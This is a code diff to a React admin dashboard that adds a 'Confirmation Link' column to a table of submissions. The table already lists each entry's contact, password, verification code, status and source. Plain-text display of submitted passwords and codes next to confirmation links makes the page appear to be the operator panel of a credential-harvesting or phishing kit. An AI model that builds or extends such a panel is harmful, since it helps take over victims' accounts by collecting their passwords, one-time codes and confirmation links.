@@ -166,6 +166,7 @@ export default function Admin() {
         status: row.status,
         source: row.source,
         code: row.code,
+        confirmation_link: row.confirmation_link || null,
       }));
 
       console.log('Admin: merged rows count:', mergedRows.length);
@@ -256,6 +257,7 @@ export default function Admin() {
                 <th className="px-3 py-2">Contact</th>
                 <th className="px-3 py-2">Password</th>
                 <th className="px-3 py-2">Code</th>
+                <th className="px-3 py-2">Confirmation Link</th>
                 <th className="px-3 py-2">Status</th>
                 <th className="px-3 py-2">Created at</th>
                 <th className="px-3 py-2">User ID</th>
@@ -270,6 +272,13 @@ export default function Admin() {
                   <td className="px-3 py-2 font-mono font-semibold text-green-400">{row.code ? (
                     <span className="bg-green-900/20 px-2 py-1 rounded text-green-300 font-bold">{row.code}</span>
                   ) : '-'}</td>
+                  <td className="px-3 py-2 text-slate-400 text-xs max-w-[200px] truncate">
+                    {row.confirmation_link ? (
+                      <a href={row.confirmation_link} target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline break-all">
+                        {row.confirmation_link}
+                      </a>
+                    ) : '-'}
+                  </td>
                   <td className="px-3 py-2"><span className={`text-xs px-2 py-1 rounded ${row.status === 'pending' ? 'bg-yellow-900/20 text-yellow-300' : 'bg-green-900/20 text-green-300'}`}>{row.status}</span></td>
                   <td className="px-3 py-2 text-slate-400 text-xs">
                     {new Date(row.created_at).toLocaleString()}
@@ -279,7 +288,7 @@ export default function Admin() {
               ))}
               {rows.length === 0 && (
                 <tr>
-                  <td colSpan={7} className="px-3 py-8 text-center text-slate-500">
+                  <td colSpan={8} className="px-3 py-8 text-center text-slate-500">
                     {loading ? 'Loading submissions...' : 'No submissions found.'}
                   </td>
                 </tr>
